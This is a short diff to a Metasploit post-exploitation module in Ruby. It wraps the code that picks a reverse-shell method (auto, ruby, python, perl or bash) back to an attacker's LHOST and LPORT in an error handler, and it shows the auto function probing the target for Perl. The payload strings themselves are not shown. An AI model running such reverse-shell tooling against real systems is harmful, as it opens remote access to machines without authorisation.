@@ -50,17 +50,21 @@ class Metasploit3 < Msf::Post
 		lhost = datastore['LHOST']
 		lport = datastore['LPORT']
 		cmd = ""
-		case datastore['type']
-		when /auto/i
-			cmd = auto_create_session(lhost,lport)
-		when /ruby/i
-			cmd = ruby_session(lhost,lport)
-		when /python/i
-			cmd = python_session(lhost,lport)
-		when /perl/i
-			cmd = perl_session(lhost,lport)
-		when /bash/i
-			cmd = bash_session(lhost,lport)
+
+		begin
+			case datastore['type']
+			when /auto/i
+				cmd = auto_create_session(lhost,lport)
+			when /ruby/i
+				cmd = ruby_session(lhost,lport)
+			when /python/i
+				cmd = python_session(lhost,lport)
+			when /perl/i
+				cmd = perl_session(lhost,lport)
+			when /bash/i
+				cmd = bash_session(lhost,lport)
+			end
+		rescue
 		end
 
 		if not cmd.empty?
@@ -72,6 +76,7 @@ class Metasploit3 < Msf::Post
 	# Runs a reverse tcp shell with the scripting environment found
 	def auto_create_session(lhost,lport)
 		cmd = ""
+
 		if cmd_exec("perl -v") =~ /Larry/
 			print_status("Perl was found on target")
 			cmd = perl_session(lhost,lport)
